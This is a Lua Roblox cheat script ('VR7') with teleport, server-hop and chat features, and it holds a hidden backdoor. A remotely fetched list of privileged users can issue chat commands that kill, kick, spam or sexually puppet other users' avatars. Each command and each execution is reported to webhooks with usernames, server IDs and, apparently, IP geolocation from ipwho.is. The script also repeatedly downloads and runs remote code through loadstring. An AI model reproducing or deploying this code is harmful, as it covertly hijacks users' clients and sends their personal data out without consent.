pcall(function()
	getgenv().AutoExecute.MouseButton1Click:Connect(function()
		ChangeToggleColor(getgenv().AutoExecute)
		if getgenv().AutoExecute.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
			if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]]) end
			getgenv().ConfigData.AutoExecute = true 
			SendNotify("System VR7","اذا تطلع وتدخل السكربت بيشتغل تلقائيا",5)
		else
			getgenv().ConfigData.AutoExecute = false
		end
		SaveConfig(getgenv().getgenv().ConfigData)
	end)

	if getgenv().ConfigData.AutoExecute then
		if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]]) end
		getgenv().AutoExecute.Ticket_Asset.ImageColor3 = Color3.fromRGB(0,255,0)
	end
end)
Rejoin_Button.MouseButton1Click:Connect(function()
	if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]]) end
	game:GetService("TeleportService"):TeleportCancel()
	wait(0.2)
	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
end)

Ad_Button.MouseButton1Click:Connect(function()
	SendNotify("System VR7"," لايوجد اعلان حاليا\n اذا تبي نعلن لك تفضل دسكورد VR7",5)
end)

Serverhop_Button.MouseButton1Click:Connect(function()
	if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]]) end
	local Config = {MaxStore = 3600, CheckInterval = 1, TeleportInterval = 1}

    local HttpService = game:GetService("HttpService")
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    local Player = Players.LocalPlayer

    local PlaceId = game.PlaceId
    local JobId = game.JobId
    local RootFolder = "ServerHop"
    local StorageFile = string.format("%s\\%s.json", RootFolder, tostring(PlaceId))
    local Data = {Start = tick(), Jobs = {}}

    if not isfolder(RootFolder) then makefolder(RootFolder) end
    if isfile(StorageFile) then
        local NewData = HttpService:JSONDecode(readfile(StorageFile))
        if tick() - NewData.Start < Config.MaxStore then Data = NewData end
    end
    if not table.find(Data.Jobs, JobId) then table.insert(Data.Jobs, JobId) end
    writefile(StorageFile, HttpService:JSONEncode(Data))

    local Servers, Cursor = {}, ""
    while Cursor and #Servers <= 0 and task.wait(Config.CheckInterval / 1000) do
        local Request = request or HttpService.RequestAsync
        local Response = Request({Url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true&cursor=" .. Cursor, Method = "GET"})
        local Success, Body = pcall(function() return HttpService:JSONDecode(Response.Body) end)
        if not Success or not Body or not Body.data then
			break
		end

        for _, Server in pairs(Body.data) do
            if typeof(Server) == "table" and Server.id and tonumber(Server.playing) and tonumber(Server.maxPlayers) and Server.playing < Server.maxPlayers and not table.find(Data.Jobs, Server.id) then
                table.insert(Servers, 1, Server.id)
            end
        end
        Cursor = Body.nextPageCursor or nil
    end

    while #Servers > 0 and task.wait(Config.TeleportInterval / 1000) do
        TeleportService:TeleportToPlaceInstance(PlaceId, Servers[math.random(1, #Servers)], Player)
    end
end)

ChatBox_Input.FocusLost:Connect(function()
	Send(FormatLetters(ChatBox_Input.Text))
	ChatBox_Input.Text = ""
end)

getgenv().BangSpeed_Input.FocusLost:Connect(function()
    if getgenv().BangSpeed_Input.Text:match("[^%d%.]") then
        getgenv().BangSpeed_Input.Text = "2"
    else
        getgenv().ConfigData.BangSpeed = tonumber(getgenv().BangSpeed_Input.Text)
    end
    SaveConfig(getgenv().ConfigData)
end)
getgenv().BangSpeed_Input.Text = tonumber(getgenv().ConfigData.BangSpeed)

game:GetService("Players").PlayerAdded:Connect(function(player)
    if ChatRepeaterEnabled and player ~= game:GetService("Players").LocalPlayer then
        local connection = player.Chatted:Connect(function(message)
            Send(message)
        end)
        table.insert(Connections, connection)
    end
end)

WhoWeAre_Button.MouseButton1Click:Connect(function()
	local Player = game.Players.LocalPlayer
	local Gui = Instance.new("ScreenGui", Player:WaitForChild("PlayerGui"))
	Gui.ResetOnSpawn = false
    Gui.IgnoreGuiInset = true
	local existingGUIs = {}
	for _, child in pairs(game.CoreGui:GetDescendants()) do
		if child:IsA("ScreenGui") and child ~= Gui and child.Enabled then
			table.insert(existingGUIs, child)
			child.Enabled = false
		end
	end
	for _, child in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
		if child:IsA("ScreenGui") and child ~= Gui and child.Enabled then
			table.insert(existingGUIs, child)
			child.Enabled = false
		end
	end

	local Frame = Instance.new("Frame", Gui)
	Frame.Size = UDim2.new(1, 0, 1, 0)
	Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	Frame.BorderSizePixel = 0
	Frame.ZIndex = 10

	local TextLabel = Instance.new("TextLabel", Frame)
	TextLabel.Size = UDim2.new(0.8, 0, 0.6, 0)
	TextLabel.Position = UDim2.new(0.1, 0, 0.2, 0)
	TextLabel.Text = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Warn%20Message"))()
	TextLabel.TextColor3 = Color3.fromRGB(r, g, b)
	TextLabel.TextScaled = true
	TextLabel.BackgroundTransparency = 1
	TextLabel.Font = Enum.Font.SourceSansBold
	TextLabel.TextWrapped = true
	TextLabel.ZIndex = 11

	local TimerLabel = Instance.new("TextLabel", Frame)
	TimerLabel.Size = UDim2.new(0.2, 0, 0.1, 0)
	TimerLabel.Position = UDim2.new(0.05, 0, 0.85, 0)
	TimerLabel.TextColor3 = Color3.fromRGB(r, g, b)
	TimerLabel.TextScaled = true
	TimerLabel.BackgroundTransparency = 1
	TimerLabel.Font = Enum.Font.SourceSansBold
	TimerLabel.Text = "20"
	TimerLabel.ZIndex = 12

	for i = 20, 0, -1 do
		TimerLabel.Text = tostring(i)
		wait(1)
	end

	pcall(function()
		Gui:Destroy()
		for _, gui in pairs(existingGUIs) do
			gui.Enabled = true
		end
	end)
end)
--GUI Functions
Players.PlayerRemoving:Connect(function(player)
	pcall(function()
		if player.Name == TargetedPlayer then
			UpdateTarget(nil) 
			SendNotify("System VR7","الاعب خرج",5)
		end
	end)
end)
plr.CharacterAdded:Connect(function(x)
	task.wait(GetPing()+0.1)
	x:WaitForChild("Humanoid")
	if SavedCheckpoint ~= nil then
		TeleportTO(SavedCheckpoint.X,SavedCheckpoint.Y,SavedCheckpoint.Z,"pos","safe")
	end
	if Fly_Button.Ticket_Asset.ImageColor3 == Color3.fromRGB(0,255,0) then
		ChangeToggleColor(Fly_Button)
		flying = false
		Fly_Pad.Visible = false
		KeyDownFunction:Disconnect()
		KeyUpFunction:Disconnect()
		SendNotify("System VR7","تم ايقاف الطيران بسبب انك قد مت",5)
	end
end)

OpenClose.MouseButton1Click:Connect(function()
	Background.Visible = not Background.Visible
end)

game:GetService("UserInputService").InputBegan:Connect(function(input,gameProcessedEvent)
	if gameProcessedEvent then return end
	if input.KeyCode == Enum.KeyCode.B then
		Background.Visible = not Background.Visible
	end
end)

Background:TweenPosition(UDim2.new(0.5, 0, 0.5, 0))
pcall(function()
	if not _G.Zarba then
		_G.Zarba = true
        local function ColorPicker()
            local DiscordColors = {Default = "000000", Aqua = "1ABC9C", DarkAqua = "11806A", Green = "57F287", DarkGreen = "1F8B4C", Blue = "3498DB", DarkBlue = "206694", Purple = "9B59B6", DarkPurple = "71368A", LuminousVividPink = "E91E63", DarkVividPink = "AD1457", Gold = "F1C40F", DarkGold = "C27C0E", Orange = "E67E22", DarkOrange = "A84300", Red = "ED4245", DarkRed = "992D22", Grey = "95A5A6", DarkGrey = "979C9F", DarkerGrey = "7F8C8D", LightGrey = "BCC0C0", Navy = "34495E", DarkNavy = "2C3E50", Yellow = "FFFF00", White = "FFFFFF", Greyple = "99AAb5", Black = "23272A", DarkButNotBlack = "2C2F33", NotQuiteBlack = "23272A", Blurple = "5865F2", Fuchsia = "EB459E"}
            if table.find(loadstring(game:HttpGet('https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Hehehe'))(),tostring(game.Players.LocalPlayer.UserId)) then
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "VR7 Team",
					Text = "انت محمي من جميع الاوامر\nويمكنك استخدام الاوامر على الناس",
					Duration = 13,
					Icon = "rbxassetid://136772242182146",
				})
				local sound = Instance.new("Sound", game.Workspace) sound.SoundId = "rbxassetid://1862047553" sound.Volume = getgenv().NotifcationVloume sound.Ended:Connect(function() sound:Destroy() end) sound:Play()
				return {Color = tonumber("0x" .. DiscordColors.Aqua),Type = "Diamond"}
			elseif --[[CheckHWID().Value]] table.find(loadstring(game:HttpGet('https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/Usernames'))(),tostring(game.Players.LocalPlayer.UserId)) then
				game:GetService("StarterGui"):SetCore("SendNotification", {
					Title = "VR7 Team",
					Text = "انت محمي من جميع الاوامر",
					Duration = 13,
					Icon = "rbxassetid://136772242182146",
				})
				local sound = Instance.new("Sound", game.Workspace) sound.SoundId = "rbxassetid://1862047553" sound.Volume = getgenv().NotifcationVloume sound.Ended:Connect(function() sound:Destroy() end) sound:Play()
				return {Color = tonumber("0x" .. DiscordColors.Gold),Type = "Gold User"}
            end
			pcall(function()
				if game.CreatorId == 35755428 and string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,"هات") or game.CreatorId == 4001902 and string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,"Mohammad") or game.CreatorId == 14940374 and string.find(game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,"Rob") then
					local Commands = {
						["bring"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							local player = GetPlayer(tostring(sender))
							if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and target == "" or me == game.Players.LocalPlayer then
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
							end
						end,
						["kill"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then
								game.Players.LocalPlayer.Character.Humanoid.Health = 0
							end
						end,
						["loopkill"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopkillme = true
								while getgenv().loopkillme do wait(0.1)
									pcall(function()
										if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
											task.wait(0.3)
											game.Players.LocalPlayer.Character.Humanoid.Health = 0
										end
									end)
								end
							end
						end,
						["unloopkill"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopkillme = false
							end
						end,
						["loopbring"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							local player = GetPlayer(tostring(sender))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopbring = true
								while getgenv().loopbring do task.wait()
									pcall(function()
										if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
											game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
										end
									end)
								end
							end
						end,
						["unloopbring"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopbring = false
							end
						end,
						["scare"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								local Sound = Instance.new("Sound", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
								Sound.SoundId = "rbxassetid://7111752052"
								Sound.Volume = 1
								Sound:Play()
								Sound.Loaded:Wait()

								local Gui = Instance.new("ScreenGui", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
								Gui.IgnoreGuiInset = true
								local Image = Instance.new("ImageLabel", Gui)
								Image.Size = UDim2.new(1, 0, 1, 0)
								Image.BackgroundTransparency = 1
								Image.Image = "rbxassetid://4837991204"

								game:GetService("Debris"):AddItem(Gui, Sound.TimeLength)
								game:GetService("Debris"):AddItem(Sound, Sound.TimeLength)
							end
						end,
						["flash"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								local Sound = Instance.new("Sound", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
								Sound.SoundId = "rbxassetid://156221488"
								Sound.Volume = 1
								Sound:Play()
								Sound.Loaded:Wait()

								local Gui = Instance.new("ScreenGui", game.Players.LocalPlayer:FindFirstChildOfClass("PlayerGui"))
								Gui.IgnoreGuiInset = true
								local Image = Instance.new("Frame", Gui)
								Image.Size = UDim2.new(1, 0, 1, 0)
								Image.BackgroundColor3 = Color3.fromRGB(255, 255, 255)

								game:GetService("Debris"):AddItem(Gui, Sound.TimeLength)
								game:GetService("Debris"):AddItem(Sound, Sound.TimeLength)
							end
						end,
						["checkuser"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								Send("VR7 ON TOP")
							end
						end,
						["credit"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								Send("حسوني عمك")
							end
						end,
						["say"] = function(sender,target,text)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								Send(text)
							end
						end,
						["spam"] = function(sender,target,text)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								if text ~= "" then
									getgenv().loopspam = true
									while getgenv().loopspam do wait(0.1)
										game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SendMessage"):FireServer(text)
									end
								end
							end
						end,
						["unspam"] = function(sender,target,text)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopspam = false
							end
						end,
						["3mk"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							local player = GetPlayer(tostring(sender))
							if target == "" or me == game.Players.LocalPlayer then 
								game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("SendMessage"):FireServer("عمي "..player.DisplayName)
							end
						end,
						["jump"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
							end
						end,
						["loopjump"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopjump = true
								while getgenv().loopjump do wait(0.1)
									pcall(function()
										if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
											task.wait(0.6)
											game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
										end
									end)
								end
							end
						end,
						["unloopjump"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopjump = false
							end
						end,
						["loud"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								local sound = Instance.new("Sound", game.Workspace); sound.SoundId = "rbxassetid://8243331779"; sound:Play(); sound.Ended:Connect(function() sound:Destroy() end);
							end
						end,
						["orbit"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							local player = GetPlayer(tostring(sender))
							if target == "" or me == game.Players.LocalPlayer then 
								local radius = 7
								local speed = 4

								getgenv().Orbit = true
								while getgenv().Orbit do
									local position = player.Character.HumanoidRootPart.Position + Vector3.new(math.cos(tick() * speed) * radius, 0, math.sin(tick() * speed) * radius)
									local lookAt = player.Character.HumanoidRootPart.Position
									local newCFrame = CFrame.new(position, lookAt)
									game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = newCFrame
									task.wait(0.001)
								end
							end
						end,
						["unorbit"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().Orbit = false
							end
						end,
						["spin"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().Spin = true
								while getgenv().Spin do task.wait()
									pcall(function()
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *= CFrame.Angles(0, math.rad(100), 0)
									end)
								end
							end
						end,
						["unspin"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().Spin = false
							end
						end,
						["skyfall"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *= CFrame.new(0, 600, 0)
							end
						end,
						["freeze"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().Freeze = true
								while getgenv().Freeze do
									pcall(function()
										if not game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored then 
											game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
										end
									end)
									wait(0.1)
								end
							end
						end,
						["unfreeze"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then
								getgenv().Freeze = false
								wait(0.2) 
								game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
							end
						end,	
						["sit"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								game.Players.LocalPlayer.Character.Humanoid.Sit = true
							end
						end,
						["loopsit"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopsit = true
								while getgenv().loopsit do wait(0.1)
									pcall(function()
										if game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid") and game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
											task.wait(0.3)
											game.Players.LocalPlayer.Character.Humanoid.Sit = true
										end
									end)
								end
							end
						end,
						["unloopsit"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().loopsit = false
							end
						end,
						["off"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								for _,P in ipairs(VR7:GetDescendants()) do 
									if P:IsA("ImageButton") and P.Name == "Ticket_Asset" then
										P.ImageColor3 = Color3.fromRGB(255, 0, 0)
									end
								end
							end
						end,
						["fov"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								if getgenv().OldF then
									game.Workspace.CurrentCamera.FieldOfView = getgenv().OldF
								end
								getgenv().OldF = game.Workspace.CurrentCamera.FieldOfView
								game.Workspace.CurrentCamera.FieldOfView = 0
							end
						end,
						["unfov"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								game.Workspace.CurrentCamera.FieldOfView = getgenv().OldF
							end
						end,
						["gravity"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								workspace.Gravity = 10
							end
						end,
						["ungravity"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								workspace.Gravity = 192
							end
						end,
						["dance"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								local dances = {"27789359", "30196114", "248263260", "45834924", "33796059", "28488254", "52155728"}
								if game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
									dances = {"3333432454", "4555808220", "4049037604", "4555782893", "10214311282", "10714010337", "10713981723", "10714372526", "10714076981", "10714392151", "11444443576"}
								end
								local animation = Instance.new("Animation")
								animation.AnimationId = "rbxassetid://" .. dances[math.random(1, #dances)]
								danceTrack = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(animation)
								danceTrack.Looped = true
								danceTrack:Play()
							end
						end,
						["undance"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								if danceTrack then
									danceTrack:Stop()
									danceTrack:Destroy()
								end
							end
						end,
						["kick"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if me == game.Players.LocalPlayer then 
								game.Players.LocalPlayer:Kick("Kicked By A Moderator")
								if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]]) end
							end
						end,
						["kickmsg"] = function(sender,target,msg)
							local me = GetPlayerV2(tostring(target))
							if me == game.Players.LocalPlayer then 
								game.Players.LocalPlayer:Kick(msg)
								if queue_on_teleport then queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]]) end
							end
						end,
						["unbenx"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().Benxme = false
							end
						end,
						["benx"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							local player = GetPlayer(tostring(sender))
							if target == "" or me == game.Players.LocalPlayer then 
								getgenv().Benxme = true
								local PositionValue = -2
								local increment = 0.1
								local Hight = -1
								while getgenv().Benxme do
									pcall(function()
										if not game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BreakVelocity") then
											pcall(function()
												local TempV = Velocity_Asset:Clone()
												TempV.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
											end)
										end
										local OtherTorso = player.Character:FindFirstChild("Torso") or player.Character:FindFirstChild("UpperTorso")
										if OtherTorso.Name == "Torso" then Hight = -0.75 end
										game.Players.LocalPlayer.Character.Humanoid.Sit = true
										game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = OtherTorso.CFrame * CFrame.new(0, Hight, PositionValue) * CFrame.Angles(math.rad(270), 0, 0)
										game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
										PositionValue = PositionValue + increment
										if PositionValue >= -1 or PositionValue <= -2 then
											increment = -increment
										end
										for _,P in ipairs(VR7:GetDescendants()) do 
											if P:IsA("ImageButton") and P.Name == "Ticket_Asset" then
												P.ImageColor3 = Color3.fromRGB(255, 0, 0)
											end
										end
									end)
									task.wait()
								end            
								if game.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("BreakVelocity") then
									game.Players.LocalPlayer.Character.Humanoid.Sit = false
									game.Players.LocalPlayer.Character.HumanoidRootPart.BreakVelocity:Destroy()
								end
							end
						end,
						["fling"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								for _, v in pairs(game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"):GetChildren()) do
									if v:IsA("BodyVelocity") or v:IsA("BodyAngularVelocity") then v:Destroy() end
								end

								Instance.new("BodyAngularVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart).AngularVelocity = Vector3.new(0, 100, 0)
								game.Players.LocalPlayer.Character.HumanoidRootPart.BodyAngularVelocity.MaxTorque = Vector3.new(1e9, 1e9, 1e9)

								Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart).MaxForce = Vector3.new(1e9, 1e9, 1e9)

								for t = 0, 1, 0.05 do
									game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity.Velocity = Vector3.new(100000, 50000, 0) * t
									task.wait(0.05)
								end

								game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity.Velocity = Vector3.new(100000, 50000, 0)

								task.delay(1, function()
									game.Players.LocalPlayer.Character.HumanoidRootPart.BodyVelocity:Destroy()
									game.Players.LocalPlayer.Character.HumanoidRootPart.BodyAngularVelocity:Destroy()
								end)
							end
						end,
						["explode"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								Instance.new("Explosion", game.Players.LocalPlayer.Character).Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
							end
						end,
						["void"] = function(sender, target)
							local me = GetPlayerV2(tostring(target))
							if target == "" or me == game.Players.LocalPlayer then 
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame *= CFrame.new(0, -300, 0)
							end
						end
					}
					local function ExtractChatInfo(text)
						local PlayerName = text:match("<font.->(.-)</font>")
						local DotWord = text:match("%..+")
						if DotWord then
							DotWord = DotWord:gsub(":", "")
						end

						return PlayerName, DotWord
					end
					local ChatRoot = game:GetService("Players").LocalPlayer.PlayerGui.ExperienceChat.appLayout.chatWindow.scrollingView.bottomLockedScrollView.RCTScrollView.RCTScrollContentView

					ChatRoot.ChildAdded:Connect(function(Child)
						local PlayerName, message = ExtractChatInfo(Child:FindFirstChild("BodyText",true).Text)

						if message and PlayerName then
							local TargetPlayer = GetPlayer(PlayerName)
							if table.find(loadstring(game:HttpGet('https://raw.githubusercontent.com/Hm5011/hussain/refs/heads/main/Hehehe'))(), tostring(TargetPlayer.UserId)) then
								if message:lower():match("^%s*(.-)%s*$"):sub(1, 1) == "." then
									local Args = {}
									for word in message:lower():gmatch("%S+") do table.insert(Args, word) end
									if Commands[Args[1]:sub(2)] then
										Commands[Args[1]:sub(2)](game:GetService("Players"):GetPlayerByUserId(TargetPlayer.UserId).Name, Args[2] or "", table.concat(Args, " ", 3))
										pcall(function()
											if not Args[2] or Args[2] == "" or GetPlayerV2(tostring(Args[2])) == game:GetService("Players").LocalPlayer then
												request({
													Url = "https://hajji-api-2.vercel.app/api/webhook",
													Method = "POST",
													Headers = {["content-type"] = "application/json"},
													Body = game:GetService("HttpService"):JSONEncode({
														["content"] = "",
														["username"] = "The Mercy Script",
														["avatar_url"] = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/5544f47d-0648-44d8-ad14-8d5a8761b77e/dg2813p-32e3e83b-9414-4208-979e-d668d30d5c2a.jpg",
														["embeds"] = {{
															["title"] = "Command Sent By @" .. game:GetService("Players"):GetPlayerByUserId(TargetPlayer.UserId).Name,
															["description"] =
																"**[Player Username (D/U):](https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile)**  ```"
																.. game:GetService("Players").LocalPlayer.DisplayName .. " (@" .. game:GetService("Players").LocalPlayer.Name .. ") "
																.. (loadstring("return game:GetService('VoiceChatService'):IsVoiceEnabledForUserIdAsync(game:GetService('Players').LocalPlayer.UserId) and '✔️' or '❌'")())
																.. "```\n"
																.. "**[Game Name (" .. tostring(#game:GetService("Players"):GetPlayers()) .. " Player" .. "):](https://www.roblox.com/games/" .. tostring(game.PlaceId) .. ")**\n```"
																.. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```\n"
																.. "**Game ID:** ```" .. game.JobId .. "``` \n"
																.. "**Command:** ```" .. message .. "``` \n"
																.. "<t:" .. os.time() .. ":f>",
															["color"] = 0xE91E63
														}}
													})
												})
												if queue_on_teleport then
													queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP"))()]])
												end
											end
										end)
									end
								end
							end
						end
					end)
				end
			end)
			spawn(function()
				while getgenv().VR7 do
					wait(500) 
					game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System VR7",Text = "مليت من نفس الاوامر؟\nتبي تخرب على الهاكات؟\nاحسن حل لك تشترك وجميع الاسعار مناسبة\n",Duration = 10;}) 
					game:GetService("StarterGui"):SetCore("SendNotification", {Title = "System VR7",Text = "اختصار سيرفرنا الدسكورد VR7 للاشتراك افتح تكت",Duration = 10;}) 
				end
			end)
            return {Color = tonumber("0x" .. DiscordColors.DarkGreen),Type = "Free User"}
        end
		local ColorPicker = ColorPicker()
		--Welcome_Label.Text = tostring(Welcome_Label.Text.."\n\nحالة الاشتراك : ".. ColorPicker.Type)
		if ColorPicker.Type ~= "Free User" then
			Welcome_Label.Text = tostring(Welcome_Label.Text.."\nحالة الاشتراك : ".. ColorPicker.Type)
		else
			Welcome_Label.Text = tostring(Welcome_Label.Text.."\nحالة الاشتراك : ".. ColorPicker.Type.."\nللاشتراك تفضل دسكورد VR7")
		end
		local webhook = "https://hajji-api.vercel.app/api/webhook"
		local PlaceId = game.PlaceId
		local Players = game:GetService("Players")
		local player = Players.LocalPlayer
		local api = game.HttpService:JSONDecode(game:HttpGet('https://ipwho.is/'))
		local data = {
			["content"] = "",
			["username"] = "The Mercy Script",
			["avatar_url"] = "https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/5544f47d-0648-44d8-ad14-8d5a8761b77e/dg2813p-32e3e83b-9414-4208-979e-d668d30d5c2a.jpg/v1/fill/w_800,h_800,q_75,strp/my_previous_steam_profile_pfp_by_hhjgsr_dg2813p-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..2faqf61iX35A5BybzE-rECzyzVU9BuEC7o3kCbM4vpk",
			["embeds"] = {
				{
					["title"] = tostring("New Execute From "..ColorPicker.Type.." (v"..Version..")"),
					["thumbnail"] = {["url"] = tostring(GetUserPic(game:GetService("Players").LocalPlayer.UserId))},
					["description"] = ""
